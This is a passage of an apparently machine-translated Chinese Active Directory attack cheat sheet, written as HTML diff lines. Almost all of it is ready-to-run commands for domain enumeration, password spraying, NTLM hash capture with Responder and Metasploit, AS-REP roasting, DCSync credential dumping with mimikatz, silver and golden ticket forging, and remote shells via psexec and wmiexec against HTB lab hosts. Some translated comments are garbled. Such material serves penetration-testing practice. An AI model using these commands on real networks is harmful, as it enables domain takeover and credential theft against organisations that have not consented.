class="hljs-built_in">Invoke-BloodHound</span> <span class="hljs-literal">-CollectionMethod</span> All<br><br><span class="hljs-comment">## ------------------| 收集信息</span><br>.\SharpHound.exe <span class="hljs-literal">-c</span> all,GPOLocalGroup,LoggedOn<br>.\SharpHound.exe <span class="hljs-literal">-c</span> all <span class="hljs-literal">-d</span> &lt;DomainName&gt;<br>.\SharpHound.exe <span class="hljs-literal">--CollectionMethods</span> all,GPOLocalGroup,LoggedOn<br><br><span class="hljs-comment">## ------------------| Usage</span><br> <span class="hljs-literal">-s</span>, <span class="hljs-literal">--searchforest</span> 搜索林中所有可用的域<br><span class="hljs-literal">--stealth</span>           隐形系列（只要可能，就首选DCO！）<br><span class="hljs-literal">--outputprefix</span>      用于前置输出文件名的字符串<br><span class="hljs-literal">--memcache</span>          将缓存保留在内存中，不写入磁盘<br><span class="hljs-literal">--zipfilename</span>       zip的文件名<br><span class="hljs-literal">--zippassword</span>       密码使用指定的密码保护zip<br><span class="hljs-literal">-c</span>, <span class="hljs-literal">--collectionmethods</span>    （默认：默认）采集方法: Container, <span class="hljs-built_in">Group</span>, LocalGroup, GPOLocalGroup,Session, LoggedOn, ObjectProps, ACL, ComputerOnly, Trusts, Default, RDP, DCOM, DCOnly<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>寻血猎犬-Python</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Dump domain info</span><br>pip3 install bloodhound<br>bloodhound<span class="hljs-literal">-python</span> <span class="hljs-literal">-u</span> &lt;username&gt; <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;&lt;password&gt;&#x27;</span> <span class="hljs-literal">-d</span> &lt;domain&gt; <span class="hljs-literal">-ns</span> &lt;IP&gt; <span class="hljs-literal">--dns-tcp</span> <span class="hljs-literal">-c</span> All<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>LDAPDomainDump</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Only Json output</span><br>ldapdomaindump <span class="hljs-literal">--no-grep</span> <span class="hljs-literal">--no-html</span> <span class="hljs-literal">-o</span> ldapinfo &lt;IP&gt; <span class="hljs-literal">-u</span> &lt;domain&gt;\\&lt;username&gt; <span class="hljs-literal">-p</span> &lt;password&gt;<br><br><span class="hljs-comment">## ------------------| Only HTML output</span><br>ldapdomaindump <span class="hljs-literal">--no-json</span> <span class="hljs-literal">--no-grep</span> <span class="hljs-literal">-o</span> ldapinfo &lt;IP&gt; <span class="hljs-literal">-u</span> &lt;domain&gt;\\&lt;username&gt; <span class="hljs-literal">-p</span> &lt;password&gt; <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/fox-it/BloodHound.py">bloodhound.py</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Run</span><br>python3 bloodhound.py <span class="hljs-literal">-d</span> &lt;domain&gt; <span class="hljs-literal">-u</span> &lt;username&gt; <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;&lt;password&gt;&#x27;</span> <span class="hljs-literal">-gc</span> &lt;domain&gt; <span class="hljs-literal">-c</span> all <span class="hljs-literal">-ns</span> &lt;IP&gt;<br><br><span class="hljs-comment">## ------------------| Usage</span><br><span class="hljs-literal">-u</span>              用户名。格式：用户名[@<span class="hljs-type">domain</span>]；如果未指定域，则使用当前域。<br><span class="hljs-literal">-p</span>              Password<br><span class="hljs-literal">-k</span>              Use kerberos<br><span class="hljs-literal">--hashes</span>        LM:NLTM hashes<br><span class="hljs-literal">-ns</span>             用于查询的备用名称服务器<br><span class="hljs-literal">--dns-tcp</span>       使用TCP而不是UDP进行DNS查询<br><span class="hljs-literal">--dns-timeout</span>   DNS查询超时（秒）（默认值：<span class="hljs-number">3</span>）<br><span class="hljs-literal">-d</span>              Domain to query.<br><span class="hljs-literal">-dc</span>             覆盖要查询的DC（主机名）<br><span class="hljs-literal">-gc</span>             覆盖要查询的<span class="hljs-built_in">GC</span>（主机名）<br><span class="hljs-literal">-w</span>              计算机枚举的工作者数量（默认值：<span class="hljs-number">10</span>）<br><span class="hljs-literal">-v</span>              启用详细输出<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>BloodHound 和 neo4j 原始查询。 [<a target="_blank" rel="noopener" href="https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/">来源</a>]</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| List all users</span><br>MATCH (u:User) <span class="hljs-keyword">return</span> u<br>MATCH (u:User) <span class="hljs-keyword">return</span> u LIMIT <span class="hljs-number">10</span><br><br><span class="hljs-comment">## ------------------| 列出具有属性的用户</span><br>MATCH (u:User) <span class="hljs-built_in">WHERE</span> u.name CONTAINS <span class="hljs-string">&quot;ADMIN&quot;</span> <span class="hljs-keyword">return</span> u.name, u.displayname, u.description<br><br><span class="hljs-comment">## ------------------| 列出启用LAPS的计算机</span><br>MATCH (c:Computer) <span class="hljs-keyword">RETURN</span> c.haslaps, COUNT(*)<br></code></pre></td></tr></table></figure>
+
+<h3 id="06-Windapsearch"><a href="#06-Windapsearch" class="headerlink" title="06.Windapsearch"></a>06.<a target="_blank" rel="noopener" href="https://github.com/ropnop/windapsearch">Windapsearch</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## 此工具用于通过LDAP匿名绑定枚举域</span><br>/opt/windapsearch/windap<span class="hljs-built_in">search-linux</span><span class="hljs-literal">-amd64</span> <span class="hljs-literal">-d</span> &lt;IP&gt; <span class="hljs-literal">-m</span> users <span class="hljs-literal">--proxy</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1080</span>     <br></code></pre></td></tr></table></figure>
+
+<h3 id="07-Kerbrute"><a href="#07-Kerbrute" class="headerlink" title="07.Kerbrute"></a>07.<a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute">Kerbrute</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| User Enumarations</span><br>kerbrute userenum /usr/share/seclists/Usernames/Names/names.txt <span class="hljs-literal">-d</span> &lt;domain&gt; <span class="hljs-literal">--dc</span> &lt;IP&gt;     <br>kerbrute userenum /usr/share/seclists/Usernames/xato<span class="hljs-literal">-net-10-million-usernames</span>.txt <span class="hljs-literal">-d</span> &lt;domain&gt; <span class="hljs-literal">--dc</span> &lt;IP&gt;     <br><br><br><span class="hljs-comment">## ------------------| Password Spray</span><br>kerbrute passwordspray &lt;usernames.txt&gt; <span class="hljs-literal">-d</span> &lt;domain&gt; <span class="hljs-literal">--dc</span> &lt;IP&gt; <span class="hljs-string">&#x27;&lt;password&gt;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="08-RPCDump-py"><a href="#08-RPCDump-py" class="headerlink" title="08.RPCDump.py"></a>08.RPCDump.py</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell">impacket<span class="hljs-literal">-rpcdump</span> &lt;IP&gt;<br><br><span class="hljs-comment">##  检查后台处理程序服务是否正在运行</span><br>impacket<span class="hljs-literal">-rpcdump</span> &lt;IP&gt; | grep <span class="hljs-literal">-A2</span> <span class="hljs-literal">-B2</span> MS<span class="hljs-literal">-RPRN</span><br><br><span class="hljs-comment"># 一个潜在的服务，可以用来提升中的权限</span><br><span class="hljs-comment"># 域是后台处理程序服务。此服务允许触发身份验证，因为</span><br><span class="hljs-comment"># 它运行的主机的计算机帐户。然后可以中继或破解</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="09-契约"><a href="#09-契约" class="headerlink" title="09.契约"></a>09.<a target="_blank" rel="noopener" href="https://github.com/cobbr/Covenant">契约</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## SharpUp命令可用于运行权限提升检查</span><br>sharpup audit<br><br><span class="hljs-comment">## shellcmd grunt命令用于发出shell命令</span><br>shellcmd whoami<br><br><span class="hljs-comment">## Import PowerShell script</span><br>PowerShellImport // PowerView.ps1<br><br><br><span class="hljs-comment">## 执行powershell脚本</span><br>PowerShell <span class="hljs-built_in">Get-DomainComputer</span> | <span class="hljs-built_in">Select</span> name<br><br><span class="hljs-comment">## kerberast用户，MakeToken，然后再运行此命令</span><br>Rubeus kerberoast<br>Kerberoast &lt;UserName&gt; hashcat<br><br><span class="hljs-comment">## 使用MakeToken命令模拟（登录到用户）用户</span><br>MakeToken username domainname password LOGON32_LOGON_INTERACTIVE<br><br><span class="hljs-comment">## DCSync</span><br>DCSync Administrator<br></code></pre></td></tr></table></figure>
+
+<h3 id="10-Dnstool（krbrelayx）"><a href="#10-Dnstool（krbrelayx）" class="headerlink" title="10.Dnstool（krbrelayx）"></a><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx">10.Dnstool（krbrelayx）</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Add DNS Record</span><br>python3 dnstool.py <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;intelligence\tiffany.molina&#x27;</span> <span class="hljs-literal">-p</span> &lt;password&gt; <span class="hljs-literal">-r</span> h4rithd <span class="hljs-literal">-a</span> add <span class="hljs-literal">-t</span> A <span class="hljs-literal">-d</span> &lt;myIP&gt; &lt;RemoteIP&gt;       <br><br><span class="hljs-comment">#### -u intelligence\Tiffany.Molina - The user to authenticate as;</span><br><span class="hljs-comment">#### -p &lt;password&gt; - The user’s password;</span><br><span class="hljs-comment">#### --action add - Adding a new record;</span><br><span class="hljs-comment">#### --record h4rithd - The domain to add;</span><br><span class="hljs-comment">#### --data &lt;MyIP&gt; - The data to add, in this case, the IP to resolve h4rithd to;</span><br><span class="hljs-comment">#### --type A - The type of record to add.</span><br><br><span class="hljs-comment">## ------------------| Check if it success</span><br>nslookup <br>&gt; server &lt;RemoteIP&gt;<br>&gt; h4rithd.intelligence.htb <br><span class="hljs-comment">## If it display my ip; we are good!!</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="11-钢哈希"><a href="#11-钢哈希" class="headerlink" title="11.钢哈希"></a>11.钢哈希</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Using Responder</span><br>sudo responder <span class="hljs-literal">-I</span> tun0<br><br><span class="hljs-comment">## ------------------| Using Metasploit</span><br>use auxiliary/server/capture/http_ntlm<br><span class="hljs-built_in">set</span> SRVPORT <span class="hljs-number">80</span><br><span class="hljs-built_in">set</span> URIPATH /<br><span class="hljs-built_in">set</span> SRVHOST &lt;MyIP&gt;<br><span class="hljs-built_in">set</span> JOHNPWFILE passwords<br>run<br></code></pre></td></tr></table></figure>
+
+<h3 id="12-gMSADumper"><a href="#12-gMSADumper" class="headerlink" title="12.gMSADumper"></a><a target="_blank" rel="noopener" href="https://github.com/micahvandeusen/gMSADumper">12.gMSADumper</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| If it has ReadGMSAPassword </span><br>python3 gMSADumper.py <span class="hljs-literal">-u</span> &lt;user&gt; <span class="hljs-literal">-p</span> &lt;password_or_LM:NT&gt; <span class="hljs-literal">-l</span> &lt;ldap_server_ip&gt; <span class="hljs-literal">-d</span> &lt;domain&gt;      <br><br><span class="hljs-comment">## ------------------| 可以使用crackmapexc验证哈希</span><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.248</span> <span class="hljs-literal">-u</span> svc_int<span class="hljs-variable">$</span> <span class="hljs-literal">-H</span> b98d4cef68f72a98dfeed732d1b1abca<br><br>^^ 如果你有散列；你可以买一张银票。<br></code></pre></td></tr></table></figure>
+
+<h3 id="13-getTGT-py"><a href="#13-getTGT-py" class="headerlink" title="13.getTGT.py"></a>13.getTGT.py</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/fortra/impacket/master/examples/getTGT.py<br>python3 getTGT.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;<br><br>export KRB5CCNAME=&lt;username&gt;.ccache  <span class="hljs-comment"># （导入票据）</span><br>klist <br></code></pre></td></tr></table></figure>
+
+<h3 id="14-getPac-py​"><a href="#14-getPac-py​" class="headerlink" title="14.getPac.py​"></a>14.getPac.py<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/fortra/impacket/master/examples/getPac.py">​</a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Get Domain SID</span><br>impacket<span class="hljs-literal">-getPac</span> <span class="hljs-literal">-targetUser</span> Administrator &lt;Domain&gt;/&lt;User&gt;:&lt;Password&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="15-AS-REP-Roasting"><a href="#15-AS-REP-Roasting" class="headerlink" title="15.AS-REP Roasting"></a>15.AS-REP Roasting</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| With Rubeus</span><br>.\Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat<br><br><span class="hljs-comment">## ------------------| With Impacket</span><br>impacket<span class="hljs-literal">-GetNPUsers</span> <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; &lt;domain&gt;/&lt;user&gt; <span class="hljs-literal">-no-pass</span>    <br>impacket<span class="hljs-literal">-GetNPUsers</span> <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; <span class="hljs-literal">-no-pass</span> <span class="hljs-literal">-usersfile</span> /usr/share/seclists/Usernames/Names/names.txt &lt;domain&gt;/     <br></code></pre></td></tr></table></figure>
+
+<h3 id="16-DCSync-攻击"><a href="#16-DCSync-攻击" class="headerlink" title="16.DCSync 攻击"></a>16.DCSync 攻击</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 先决条件</span><br><span class="hljs-comment">## 特权帐户（管理员、域管理员或企业管理员）</span><br><br><span class="hljs-comment">## ------------------| 要求KRBTGT的证书</span><br>.\mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync&quot;</span> <span class="hljs-string">&quot;/domain:&lt;DOMIAIN&gt; /user:krbtgt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt;&gt; DCSync.out<br><br><span class="hljs-comment">## ------------------| 请求h4rithd用户的凭据</span><br>.\mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync&quot;</span> <span class="hljs-string">&quot;/domain:&lt;DOMIAIN&gt; /user:h4rithd&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt;&gt; DCSync.out<br></code></pre></td></tr></table></figure>
+
+<h3 id="17-白银票据"><a href="#17-白银票据" class="headerlink" title="17.白银票据"></a>17.白银票据</h3><ul>
+<li>先决条件</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## 域名                   --&gt; systeminfo | findstr /B &quot;Domain&quot;</span><br><span class="hljs-comment">## 服务帐户的密码           --&gt; 执行kerberoasting或使用mimikatz来转储哈希</span><br><br><span class="hljs-comment">## ------------------| 将密码转换为哈希 </span><br>.\Rubeus.exe hash /password:&lt;password&gt;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>与 Rubeus 一起传递票证</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\Rubeus.exe silver /service:&lt;servicePrincipalName&gt; /rc4:&lt;NTML<span class="hljs-literal">-HASH</span>&gt; /sid:&lt;domain_sid&gt; /user:&lt;NonExistentUser&gt; /domain:&lt;domain_name&gt; /ptt<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>使用 mimikatz 传递票证</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 冲洗和注入票证</span><br>.\mimikatz.exe <span class="hljs-string">&quot;kerberos::purge&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br>.\mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /user:&lt;NonExistentUser&gt; /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /target:&lt;FQHN_service_account&gt; /service:HTTP /rc4:&lt;ntml_hash&gt; /ptt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt;&gt; mimikatz<span class="hljs-literal">-silver</span>.out       <br><br><span class="hljs-comment"># ^ MSSQLSvc/SqlServer.htb.com</span><br><span class="hljs-comment">## ------------------| Get Shell</span><br>.\PsExec.exe <span class="hljs-literal">-accepteula</span> \\&lt;FQHN_service_account&gt; cmd <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>使用 python 传递票证</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 需要同步日期（NETBIOS时间）</span><br>sudo ntpdate &lt;RemoteIP&gt;<br><br><span class="hljs-comment">## ------------------| Get Silver Ticket</span><br>python3 ticketer.py <span class="hljs-literal">-nthash</span> &lt;ntml_hash&gt; <span class="hljs-literal">-domain-sid</span> &lt;domain_sid&gt; <span class="hljs-literal">-domain</span> &lt;domain_name&gt; <span class="hljs-literal">-user-id</span> <span class="hljs-number">500</span> Administrator <span class="hljs-literal">-spn</span> &lt;FQHN_service_account&gt;     <br>impacket<span class="hljs-literal">-getST</span> <span class="hljs-literal">-dc-ip</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.248</span> <span class="hljs-literal">-spn</span> www/dc.intelligence.htb <span class="hljs-literal">-hashes</span> :&lt;ntml_hash&gt; <span class="hljs-literal">-impersonate</span> Administrator &lt;domain_name&gt;/&lt;FQHN_service_account&gt;    <br><br><span class="hljs-comment">#### -dc-ip 10.10.10.248</span><br><span class="hljs-comment">#### -spn - To get the SPN, that’s in the Node Info -&gt; Node Properties section for the svc_int user in Bloodhound        </span><br><span class="hljs-comment">#### -hashes - the NTLM I collected earlier using gMSADumper.py</span><br><span class="hljs-comment">#### -impersonate - the user I want a ticket for</span><br><br><span class="hljs-comment">## ------------------| 银票登录</span><br>export KRB5CCNAME=Administrator.ccache   <span class="hljs-comment"># （导入票据）</span><br>impacket<span class="hljs-literal">-psexec</span> <span class="hljs-literal">-k</span> <span class="hljs-literal">-no-pass</span> Administrator@dc.intelligence.htb<br></code></pre></td></tr></table></figure>
+
+<h3 id="18-黄金票据"><a href="#18-黄金票据" class="headerlink" title="18.黄金票据"></a>18.黄金票据</h3><ul>
+<li>先决条件</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## 模拟用户 </span><br><span class="hljs-comment">## Domain Name    --&gt; systeminfo | findstr /B &quot;Domain&quot;</span><br><span class="hljs-comment">## SID            --&gt; whoami /user  or Get-ADDomain &lt;DOMAIN_NAME&gt;</span><br><span class="hljs-comment">## 域KRBTGT帐户NTLM密码哈希    --&gt; DCSync Attack</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>黄金票据攻击过程</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 获取域SID</span><br>impacket<span class="hljs-literal">-lookupsid</span> [<span class="hljs-type">domain</span>/]username[:<span class="hljs-type">password</span>]<span class="hljs-selector-tag">@</span>]&lt;IP&gt;<br><br><span class="hljs-comment">## ------------------| 提取Krbtgt哈希</span><br>impacket<span class="hljs-literal">-secretsdump</span> [<span class="hljs-type">domain</span>/]username[:<span class="hljs-type">password</span>]<span class="hljs-selector-tag">@</span>]&lt;IP&gt; <span class="hljs-literal">-outputfile</span> krb <span class="hljs-literal">-user-status</span><br>impacket<span class="hljs-literal">-secretsdump</span> [<span class="hljs-type">domain</span>/]username[:<span class="hljs-type">password</span>]<span class="hljs-selector-tag">@</span>]&lt;IP&gt; <span class="hljs-literal">-outputfile</span> krb <span class="hljs-literal">-user-status</span> <span class="hljs-literal">-just-dc-user</span> krbtgt <span class="hljs-literal">-just-dc-ntlm</span><br><br><span class="hljs-comment">## ------------------| 生成TGT</span><br><span class="hljs-comment">## [NTLM Hash]</span><br>impacket<span class="hljs-literal">-ticketer</span> <span class="hljs-literal">-nthash</span> &lt;krbtgt_ntlm_hash&gt; <span class="hljs-literal">-domain-sid</span> &lt;domain_sid&gt; <span class="hljs-literal">-domain</span> &lt;domain_name&gt;  &lt;user_name&gt;<br><span class="hljs-comment">## [AES Key]</span><br>impacket<span class="hljs-literal">-ticketer</span> <span class="hljs-literal">-aesKey</span> &lt;aes_key&gt; <span class="hljs-literal">-domain-sid</span> &lt;domain_sid&gt; <span class="hljs-literal">-domain</span> &lt;domain_name&gt;  &lt;user_name&gt;<br><br><span class="hljs-comment">## ------------------| 转换kirbi，ccache</span><br>impacket<span class="hljs-literal">-ticketConverter</span> ticket.kirbi /tmp/ticket.ccache<br>impacket<span class="hljs-literal">-ticketConverter</span> ticket.ccache /tmp/ticket.kirbi<br><br><span class="hljs-comment">## ------------------| 设置票证以供使用</span><br>export KRB5CCNAME=/tmp/ticket.[<span class="hljs-type">ccache</span>/<span class="hljs-type">kirbi</span>]<br>klist<br><br><span class="hljs-comment">## ------------------| 使用TGT使用以下任意一项执行远程命令</span><br><span class="hljs-comment">## !! 记住不要使用IP地址。始终使用主机名.domain</span><br>python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;<span class="hljs-selector-tag">@</span>&lt;remote_hostname.domain&gt; <span class="hljs-literal">-k</span> <span class="hljs-literal">-no-pass</span><br>python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;<span class="hljs-selector-tag">@</span>&lt;remote_hostname.domain&gt; <span class="hljs-literal">-k</span> <span class="hljs-literal">-no-pass</span><br>python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;<span class="hljs-selector-tag">@</span>&lt;remote_hostname.domain&gt; <span class="hljs-literal">-k</span> <span class="hljs-literal">-no-pass</span><br>impacket<span class="hljs-literal">-psexec</span> &lt;domain_name&gt;/&lt;user_name&gt;<span class="hljs-selector-tag">@</span>&lt;remote_hostname.domain&gt; <span class="hljs-literal">-k</span> <span class="hljs-literal">-no-pass</span><br><br><span class="hljs-comment">## ------------------| 处理错误</span><br><span class="hljs-comment">## KRB_AP_ERR_SKEW(时钟偏移过大) --&gt; sudo ntpdate &lt;DCIP&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>与<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Pass the Ticket [/ppt]</span><br><span class="hljs-comment">## 如果在生成票证时在命令末尾使用/ptt， </span><br><span class="hljs-comment">## 然后可以使用misc::cmd命令，然后使用psexec.exe获取cmd shell。</span><br><br><span class="hljs-comment">## ------------------| Generate the ticket</span><br><span class="hljs-comment">## 如果在生成票证时没有在命令末尾使用/ppt，</span><br><span class="hljs-comment">## 它将把票存储为ticket.kirbi文件。</span><br><span class="hljs-comment">## 这张TGT票有效期为10年</span><br><br><span class="hljs-comment">## ------------------| RID</span><br><span class="hljs-comment">## 您可以使用/id:500生成管理员票证</span><br><br><span class="hljs-comment">## ------------------| To generate the TGT</span><br><span class="hljs-comment">## [NTLM Hash]</span><br>kerberos::golden /user:h4rithd /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /krbtgt:&lt;krbtgt_ntlm_hash&gt; /ptt<br>kerberos::golden /user:h4rithd /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /krbtgt:&lt;krbtgt_ntlm_hash&gt; /id:<span class="hljs-number">500</span> /ptt<br>kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt;<br><span class="hljs-comment">## [AES 128 